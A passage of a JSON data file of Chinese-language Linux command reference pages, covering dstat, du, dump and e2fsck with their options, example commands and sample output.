        "body": "<h1 id=\"dstat\">dstat</h1>\n<p>通用的系统资源统计工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dstat命令</strong> 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具，是一个全能系统信息统计工具。与sysstat相比，dstat拥有一个彩色的界面，在手动观察性能状况时，数据比较显眼容易观察；而且dstat支持即时刷新，譬如输入<code>dstat 3</code>即每三秒收集一次，但最新的数据都会每秒刷新显示。和sysstat相同的是，dstat也可以收集指定的性能资源，譬如<code>dstat -c</code>即显示CPU的使用情况。</p>\n<h3 id=\"下载安装\">下载安装</h3>\n<p> <strong>方法一</strong> </p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> -y dstat\n</code></pre>\n<p> <strong>方法二</strong> </p>\n<p>官网下载地址：<a href=\"http://dag.wieers.com/rpm/packages/dstat\">http://dag.wieers.com/rpm/packages/dstat</a></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget</span> http://dag.wieers.com/rpm/packages/dstat/dstat-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">7</span>-<span class=\"hljs-number\">1</span>.rh7.rf.noarch.rpm\n<span class=\"hljs-attribute\">rpm</span> -ivh dstat-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">7</span>-<span class=\"hljs-number\">1</span>.rh7.rf.noarch.rpm\n</code></pre>\n<h3 id=\"使用说明\">使用说明</h3>\n<p>安装完后就可以使用了，dstat非常强大，可以实时的监控cpu、磁盘、网络、IO、内存等使用情况。</p>\n<p>直接使用dstat，默认使用的是<code>-cdngy</code>参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。可以在最后指定显示一条信息的时间间隔，如<code>dstat&nbsp;5</code>是没5s显示一条，<code>dstat&nbsp;5&nbsp;10</code>表示没5s显示一条，一共显示10条。</p>\n<pre><code class=\"language-shell\">[root@iZ23uulau1tZ ~]<span class=\"hljs-comment\"># dstat</span>\n----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw\n <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 99 </span> <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|7706B  164k|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 189 </span>  225\n <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>100  <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|4436B  826B|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 195 </span>  248\n <span class=\"hljs-number\"> 1 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 99 </span> <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|4744B  346B|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 203 </span>  242\n <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>100  <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|5080B  346B|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 206 </span>  242\n <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 99 </span> <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|5458B  444B|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 214 </span>  244\n <span class=\"hljs-number\"> 1 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 99 </span> <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|5080B  346B|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>|<span class=\"hljs-number\"> 208 </span>  242\n</code></pre>\n<p>下面对显示出来的部分信息作一些说明：</p>\n<ol>\n<li> cpu：hiq、siq分别为硬中断和软中断次数。</li>\n<li> system：int、csw分别为系统的中断次数（interrupt）和上下文切换（context&nbsp;switch）。</li>\n</ol>\n<p>其他的都很好理解。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">dstat <span class=\"hljs-comment\">[-afv]</span> <span class=\"hljs-comment\">[options..]</span> <span class=\"hljs-comment\">[delay <span class=\"hljs-comment\">[count]</span>]</span>\n</code></pre>\n<h3 id=\"常用选项\">常用选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：显示CPU系统占用，用户占用，空闲，等待，中断，软件中断等信息。</span>\n<span class=\"hljs-deletion\">-C：当有多个CPU时候，此参数可按需分别显示cpu状态，例：-C 0,1 是显示cpu0和cpu1的信息。</span>\n<span class=\"hljs-deletion\">-d：显示磁盘读写数据大小。</span>\n<span class=\"hljs-deletion\">-D hda,total：include hda and total。</span>\n<span class=\"hljs-deletion\">-n：显示网络状态。</span>\n<span class=\"hljs-deletion\">-N eth1,total：有多块网卡时，指定要显示的网卡。</span>\n<span class=\"hljs-deletion\">-l：显示系统负载情况。</span>\n<span class=\"hljs-deletion\">-m：显示内存使用情况。</span>\n<span class=\"hljs-deletion\">-g：显示页面使用情况。</span>\n<span class=\"hljs-deletion\">-p：显示进程状态。</span>\n<span class=\"hljs-deletion\">-s：显示交换分区使用情况。</span>\n<span class=\"hljs-deletion\">-S：类似D/N。</span>\n<span class=\"hljs-deletion\">-r：I/O请求情况。</span>\n<span class=\"hljs-deletion\">-y：系统状态。</span>\n<span class=\"hljs-deletion\">--ipc：显示ipc消息队列，信号等信息。</span>\n<span class=\"hljs-deletion\">--socket：用来显示tcp udp端口状态。</span>\n<span class=\"hljs-deletion\">-a：此为默认选项，等同于-cdngy。</span>\n<span class=\"hljs-deletion\">-v：等同于 -pmgdsc -D total。</span>\n<span class=\"hljs-deletion\">--output 文件：此选项也比较有用，可以把状态信息以csv的格式重定向到指定的文件中，以便日后查看。例：dstat --output /root/dstat.csv &amp; 此时让程序默默的在后台运行并把结果输出到/root/dstat.csv文件中。</span>\n</code></pre>\n<p>当然dstat还有很多更高级的用法，常用的基本这些选项，更高级的用法可以结合man文档。</p>\n<h3 id=\"实例\">实例</h3>\n<p>如想监控swap，process，sockets，filesystem并显示监控的时间：</p>\n<pre><code class=\"language-shell\">[root@iZ23uulau1tZ ~]<span class=\"hljs-comment\"># dstat -tsp --socket --fs</span>\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:23:48|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>0.0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6488\n26-07 09:23:49|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6488\n26-07 09:23:50|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6489\n26-07 09:23:51|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6489\n26-07 09:23:52|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6489\n26-07 09:23:53|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 704 </span>  6489\n</code></pre>\n<p>若要将结果输出到文件可以加<code>--output&nbsp;filename</code>：</p>\n<pre><code class=\"language-shell\">[root@iZ23uulau1tZ ~]<span class=\"hljs-comment\"># dstat -tsp --socket --fs --output /tmp/ds.csv</span>\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:25:31|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>0.0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6493\n26-07 09:25:32|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6493\n26-07 09:25:33|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6493\n26-07 09:25:34|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6493\n26-07 09:25:35|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6494\n26-07 09:25:36|  <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>| <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>  0|104  <span class=\"hljs-number\"> 8 </span> <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span>  0| <span class=\"hljs-number\"> 736 </span>  6494\n</code></pre>\n<p>这样生成的csv文件可以用excel打开，然后生成图表。</p>\n<p>通过<code>dstat&nbsp;--list</code>可以查看dstat能使用的所有参数，其中上面internal是dstat本身自带的一些监控参数，下面<code>/usr/share/dstat</code>中是dstat的插件，这些插件可以扩展dstat的功能，如可以监控电源（battery）、mysql等。</p>\n<p>下面这些插件并不是都可以直接使用的，有的还依赖其他包，如想监控mysql，必须要装python连接mysql的一些包。</p>\n<pre><code class=\"language-shell\">[root@iZ23uulau1tZ ~]# dstat --<span class=\"hljs-keyword\">list</span>\ninternal:\n        aio, cpu, cpu24, disk, disk24, disk24old, epoch, fs, int, int24, io, ipc, <span class=\"hljs-keyword\">load</span>, lock, mem, net, page, page24, <span class=\"hljs-keyword\">proc</span>,<span class=\"hljs-title\"> raw,</span> socket,<span class=\"hljs-title\"> swap,</span> swapold,<span class=\"hljs-title\"> sys,</span> tcp,<span class=\"hljs-title\"> time,</span> udp,<span class=\"hljs-title\"> unix,</span> vm\n/usr/share/dstat:<span class=\"hljs-title\">\n        battery,</span> battery-remain,<span class=\"hljs-title\"> cpufreq,</span> dbus,<span class=\"hljs-title\"> disk-util,</span> fan,<span class=\"hljs-title\"> freespace,</span> gpfs,<span class=\"hljs-title\"> gpfs-ops,</span> helloworld,<span class=\"hljs-title\"> innodb-buffer,</span> innodb-io,<span class=\"hljs-title\"> innodb-ops,</span> lustre,<span class=\"hljs-title\"> memcache-hits,</span> mysql-io,<span class=\"hljs-title\"> mysql-keys,</span> mysql5-cmds,<span class=\"hljs-title\"> mysql5-conn,</span> mysql5-io,<span class=\"hljs-title\"> mysql5-keys,</span>\n<span class=\"hljs-title\">        net-packets,</span> nfs3,<span class=\"hljs-title\"> nfs3-ops,</span> nfsd3,<span class=\"hljs-title\"> nfsd3-ops,</span> ntp,<span class=\"hljs-title\"> postfix,</span> power,<span class=\"hljs-title\"> proc-count,</span> rpc,<span class=\"hljs-title\"> rpcd,</span> sendmail,<span class=\"hljs-title\"> snooze,</span> thermal,<span class=\"hljs-title\"> top-bio,</span> top-cpu,<span class=\"hljs-title\"> top-cputime,</span> top-cputime-avg,<span class=\"hljs-title\"> top-io,</span> top-latency,<span class=\"hljs-title\"> top-latency-avg,</span> top-mem,<span class=\"hljs-title\"> top-oom,</span> utmp,<span class=\"hljs-title\">\n        vm-memctl,</span> vmk-hba,<span class=\"hljs-title\"> vmk-int,</span> vmk-nic,<span class=\"hljs-title\"> vz-cpu,</span> vz-io,<span class=\"hljs-title\"> vz-ubc,</span> wifi\n</code></pre>\n<p>dstat命令的基本用法就说到这里，更多用法有待摸索，如果您需要补充内容请给我们发邮件，谢谢！</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "du",
        "des": "显示每个文件和目录的磁盘使用空间",
        "body": "<h1 id=\"du\">du</h1>\n<p>显示每个文件和目录的磁盘使用空间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>du命令</strong> 也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">du <span class=\"hljs-selector-attr\">[选项]</span><span class=\"hljs-selector-attr\">[文件]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">a</span>, <span class=\"hljs-built_in\">--all</span>                              显示目录中个别文件的大小。\n-<span class=\"hljs-string\">B</span>, <span class=\"hljs-built_in\">--block-size=大小</span>                  使用指定字节数的块\n-<span class=\"hljs-string\">b</span>, <span class=\"hljs-built_in\">--bytes</span>                            显示目录或文件大小时，以<span class=\"hljs-string\">byte</span>为单位。\n-<span class=\"hljs-string\">c</span>, <span class=\"hljs-built_in\">--total</span>                            除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。\n-<span class=\"hljs-string\">D</span>, <span class=\"hljs-built_in\">--dereference-args</span>                 显示指定符号链接的源文件大小。\n-<span class=\"hljs-string\">H</span>, <span class=\"hljs-built_in\">--si</span>                               与-<span class=\"hljs-string\">h</span>参数相同，但是<span class=\"hljs-string\">K</span>，<span class=\"hljs-string\">M</span>，<span class=\"hljs-string\">G</span>是以<span class=\"hljs-string\">1000</span>为换算单位。\n-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--human-readable</span>                   以<span class=\"hljs-string\">K</span>，<span class=\"hljs-string\">M</span>，<span class=\"hljs-string\">G</span>为单位，提高信息的可读性。\n-<span class=\"hljs-string\">k</span>, <span class=\"hljs-built_in\">--kilobytes</span>                        以<span class=\"hljs-string\">KB</span>(<span class=\"hljs-string\">1024bytes</span>)为单位输出。\n-<span class=\"hljs-string\">l</span>, <span class=\"hljs-built_in\">--count-links</span>                      重复计算硬件链接的文件。\n-<span class=\"hljs-string\">m</span>, <span class=\"hljs-built_in\">--megabytes</span>                        以<span class=\"hljs-string\">MB</span>为单位输出。\n-<span class=\"hljs-string\">L</span>&lt;符号链接&gt;, <span class=\"hljs-built_in\">--dereference&lt;符号链接&gt;</span>  显示选项中所指定符号链接的源文件大小。\n-<span class=\"hljs-string\">P</span>, <span class=\"hljs-built_in\">--no-dereference</span>                   不跟随任何符号链接(默认)\n-<span class=\"hljs-string\">0</span>, <span class=\"hljs-built_in\">--null</span>                             将每个空行视作<span class=\"hljs-string\">0</span> 字节而非换行符\n-<span class=\"hljs-string\">S</span>, <span class=\"hljs-built_in\">--separate-dirs</span>                    显示个别目录的大小时，并不含其子目录的大小。\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--summarize</span>                        仅显示总计，只列出最后加总的值。\n-<span class=\"hljs-string\">x</span>, <span class=\"hljs-built_in\">--one-file-xystem</span>                  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。\n-<span class=\"hljs-string\">X</span>&lt;文件&gt;, <span class=\"hljs-built_in\">--exclude-from=&lt;文件&gt;</span>        在&lt;文件&gt;指定目录或文件。\n<span class=\"hljs-built_in\">--apparent-size</span>                        显示表面用量，而并非是磁盘用量；虽然表面用量通常会小一些，但有时它会因为稀疏文件间的<span class=\"hljs-string\">\"洞\"</span>、内部碎片、非直接引用的块等原因而变大。\n<span class=\"hljs-built_in\">--files0-from=F</span>                        计算文件<span class=\"hljs-string\">F</span>中以<span class=\"hljs-string\">NUL</span>结尾的文件名对应占用的磁盘空间如果<span class=\"hljs-string\">F</span>的值是<span class=\"hljs-string\">\"-\"</span>，则从标准输入读入文件名\n<span class=\"hljs-built_in\">--exclude=&lt;目录或文件&gt;</span>                 略过指定的目录或文件。\n<span class=\"hljs-built_in\">--max-depth=N</span>                          显示目录总计(与<span class=\"hljs-built_in\">--all</span> 一起使用计算文件)当<span class=\"hljs-string\">N</span>为指定数值时计算深度为<span class=\"hljs-string\">N</span>，等于<span class=\"hljs-string\">0</span>时等同<span class=\"hljs-built_in\">--summarize</span>\n<span class=\"hljs-built_in\">--si</span>                                   类似-<span class=\"hljs-string\">h</span>，但在计算时使用<span class=\"hljs-string\">1000</span> 为基底而非<span class=\"hljs-string\">1024</span>\n<span class=\"hljs-built_in\">--time</span>                                 显示目录或该目录子目录下所有文件的最后修改时间\n<span class=\"hljs-built_in\">--time=WORD</span>                            显示<span class=\"hljs-string\">WORD</span>时间，而非修改时间：<span class=\"hljs-string\">atime</span>，<span class=\"hljs-string\">access</span>，<span class=\"hljs-string\">use</span>，<span class=\"hljs-string\">ctime</span> 或<span class=\"hljs-string\">status</span>\n<span class=\"hljs-built_in\">--time-style=样式</span>                      按照指定样式显示时间(样式解释规则同<span class=\"hljs-string\">\"date\"</span>命令)：<span class=\"hljs-string\">full-iso</span>，<span class=\"hljs-string\">long-iso</span>，<span class=\"hljs-string\">iso</span>，+<span class=\"hljs-string\">FORMAT</span>\n<span class=\"hljs-built_in\">--help</span>                                 显示此帮助信息并退出\n<span class=\"hljs-built_in\">--version</span>                              显示版本信息并退出\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>文件从大到小排序</p>\n<pre><code><span class=\"hljs-variable\">ubuntu</span><span class=\"hljs-operator\">@</span><span class=\"hljs-variable\">VM</span><span class=\"hljs-operator\">-</span><span class=\"hljs-number\">0</span><span class=\"hljs-operator\">-</span><span class=\"hljs-number\">14</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">ubuntu</span><span class=\"hljs-operator\">:~/</span><span class=\"hljs-variable\">git</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">work</span><span class=\"hljs-operator\">/</span><span class=\"hljs-variable\">linux</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">command$</span> <span class=\"hljs-variable\">du</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">sh</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-operator\">|</span><span class=\"hljs-variable\">sort</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">rh</span>\n<span class=\"hljs-number\">2.9</span><span class=\"hljs-variable\">M</span>    <span class=\"hljs-variable\">command</span>\n<span class=\"hljs-number\">1.9</span><span class=\"hljs-variable\">M</span>    <span class=\"hljs-variable\">assets</span>\n<span class=\"hljs-number\">148</span><span class=\"hljs-built_in\">K</span>    <span class=\"hljs-variable\">template</span>\n<span class=\"hljs-number\">72</span><span class=\"hljs-built_in\">K</span>     <span class=\"hljs-variable\">package</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">lock</span><span class=\"hljs-operator\">.</span><span class=\"hljs-variable\">json</span>\n<span class=\"hljs-number\">52</span><span class=\"hljs-built_in\">K</span>     <span class=\"hljs-variable\">dist</span>\n<span class=\"hljs-number\">28</span><span class=\"hljs-built_in\">K</span>     <span class=\"hljs-variable\">build</span>\n<span class=\"hljs-number\">16</span><span class=\"hljs-built_in\">K</span>     <span class=\"hljs-variable\">README</span><span class=\"hljs-operator\">.</span><span class=\"hljs-variable\">md</span>\n<span class=\"hljs-number\">4.0</span><span class=\"hljs-built_in\">K</span>    <span class=\"hljs-variable\">renovate</span><span class=\"hljs-operator\">.</span><span class=\"hljs-variable\">json</span>\n<span class=\"hljs-number\">4.0</span><span class=\"hljs-built_in\">K</span>    <span class=\"hljs-variable\">package</span><span class=\"hljs-operator\">.</span><span class=\"hljs-variable\">json</span>\n<span class=\"hljs-number\">4.0</span><span class=\"hljs-built_in\">K</span>    <span class=\"hljs-variable\">LICENSE</span>\n</code></pre>\n<p>只显示当前目录下子目录的大小。</p>\n<pre><code class=\"language-shell\">ubuntu@VM-<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">14</span>-ubuntu:~<span class=\"hljs-regexp\">/git-work/</span>linux-command$ du -sh .<span class=\"hljs-regexp\">/*/</span>\n<span class=\"hljs-number\">1.9</span>M    .<span class=\"hljs-regexp\">/assets/</span>\n<span class=\"hljs-number\">28</span>K     .<span class=\"hljs-regexp\">/build/</span>\n<span class=\"hljs-number\">2.9</span>M    .<span class=\"hljs-regexp\">/command/</span>\n<span class=\"hljs-number\">52</span>K     .<span class=\"hljs-regexp\">/dist/</span>\n<span class=\"hljs-number\">148</span>K    .<span class=\"hljs-regexp\">/template/</span>\n</code></pre>\n<p>查看指定目录下文件所占的空间：</p>\n<pre><code class=\"language-shell\">ubuntu@VM-0-14-ubuntu:~<span class=\"hljs-string\">/git-work/linux-command/assets</span>$ du <span class=\"hljs-string\">./</span>*\n144     <span class=\"hljs-string\">./alfred.png</span>\n452     <span class=\"hljs-string\">./chrome-extensions.gif</span>\n4       <span class=\"hljs-string\">./dash-icon.png</span>\n1312    <span class=\"hljs-string\">./Linux.gif</span>\n16      <span class=\"hljs-string\">./qr.png</span>\n</code></pre>\n<p>只显示总和的大小:</p>\n<pre><code class=\"language-shell\">ubuntu<span class=\"hljs-variable\">@VM</span>-<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">14</span>-<span class=\"hljs-symbol\">ubuntu:</span>~<span class=\"hljs-regexp\">/git-work/linux</span>-command/assets<span class=\"hljs-variable\">$ </span>du -s .\n<span class=\"hljs-number\">1932</span>    .\n</code></pre>\n<p>显示总和的大小且易读:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ubuntu</span>@VM-<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">14</span>-ubuntu:~/git-work/linux-command/assets$ du -sh .\n<span class=\"hljs-attribute\">1</span>.<span class=\"hljs-number\">9</span>M    .\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dump",
        "des": "用于备份ext2或者ext3文件系统",
        "body": "<h1 id=\"dump\">dump</h1>\n<p>用于备份ext2或者ext3文件系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dump命令</strong> 用于备份ext2或者ext3文件系统。可将目录或整个文件系统备份至指定的设备，或备份成一个大文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dump</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-0123456789：备份的层级；</span>\n<span class=\"hljs-deletion\">-b&lt;区块大小&gt;：指定区块的大小，单位为KB；</span>\n<span class=\"hljs-deletion\">-B&lt;区块数目&gt;：指定备份卷册的区块数目；</span>\n<span class=\"hljs-deletion\">-c：修改备份磁带预设的密度与容量；</span>\n<span class=\"hljs-deletion\">-d&lt;密度&gt;：设置磁带的密度。单位为BPI；</span>\n<span class=\"hljs-deletion\">-f&lt;设备名称&gt;：指定备份设备；</span>\n<span class=\"hljs-deletion\">-h&lt;层级&gt;：当备份层级等于或大于指定的层级时，将不备份用户标示为“nodump”的文件；</span>\n<span class=\"hljs-deletion\">-n：当备份工作需要管理员介入时，向所有“operator”群组中的使用者发出通知；</span>\n<span class=\"hljs-deletion\">-s&lt;磁带长度&gt;：备份磁带的长度，单位为英尺；</span>\n<span class=\"hljs-deletion\">-T&lt;日期&gt;：指定备份的时间与日期；</span>\n<span class=\"hljs-deletion\">-u：备份完毕后，在/etc/dumpdates中记录备份的文件系统、层级、日期与时间等；</span>\n<span class=\"hljs-deletion\">-w：与-W类似，但仅显示需要备份的文件；</span>\n<span class=\"hljs-deletion\">-W：显示需要备份的文件及其最后一次备份的层级、时间与日期。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>备份源：指定要备份的文件、目录或者文件系统。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/home</code>目录所有内容备份到<code>/tmp/homeback.bak</code>文件中，备份层级为<code>0</code>并在<code>/etc/dumpdates</code>中记录相关信息：</p>\n<pre><code class=\"language-shell\">‍<span class=\"hljs-keyword\">dump</span> -<span class=\"hljs-number\">0</span>u -f <span class=\"hljs-regexp\">/tmp/</span>homeback.bak /home\n</code></pre>\n<p>将<code>/home</code>目录所有内容备份到<code>/tmp/homeback.bak</code>文件中，备份层级为<code>1</code>（只备份上次使用层次<code>0</code>备份后发生过改变的数据）并在<code>/etc/dumpdates</code>中记录相关信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">dump</span> -<span class=\"hljs-number\">1</span>u -f <span class=\"hljs-regexp\">/tmp/</span>homeback.bak /home\n</code></pre>\n<p>通过dump命令的备份层级，可实现完整+增量备份、完整+差异备份，在配合crontab可以实现无人值守备份。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "e2fsck",
        "des": "用于检查第二扩展文件系统的完整性",
        "body": "<h1 id=\"e2fsck\">e2fsck</h1>\n<p>用于检查第二扩展文件系统的完整性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>e2fsck命令</strong> 用于检查第二扩展文件系统的完整性，通过适当的选项可以尝试修复出现的错误。</p>\n<p>e2fsck执行后的传回值及代表意义如下：</p>\n<ul>\n<li>  0 没有任何错误发生。</li>\n<li>  1 文件系统发生错误，并且已经修正。</li>\n<li>  2 文件系统发生错误，并且已经修正。</li>\n<li>  4 文件系统发生错误，但没有修正。</li>\n<li>  8 运作时发生错误。</li>\n<li>  16 使用的语法发生错误。</li>\n<li>  128 共享的函数库发生错误。</li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">e2fsck</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：不询问使用者意见，便自动修复文件系统；</span>\n<span class=\"hljs-deletion\">-b&lt;superblock&gt;：指定superblock，而不使用预设的superblock；</span>\n<span class=\"hljs-deletion\">-B&lt;区块大小&gt;：指定区块的大小，单位为字节；</span>\n<span class=\"hljs-deletion\">-c：一并执行badblocks，以标示损坏的区块；</span>\n<span class=\"hljs-deletion\">-C：将检查过程的信息完整记录在file descriptor中，使得整个检查过程都能完整监控；</span>\n<span class=\"hljs-deletion\">-d：显示排错信息；</span>\n<span class=\"hljs-deletion\">-f：即使文件系统没有错误迹象，仍强制地检查正确性；</span>\n<span class=\"hljs-deletion\">-F：执行前先清除设备的缓冲区；</span>\n<span class=\"hljs-deletion\">-l&lt;文件&gt;：将文件中指定的区块加到损坏区块列表；</span>\n<span 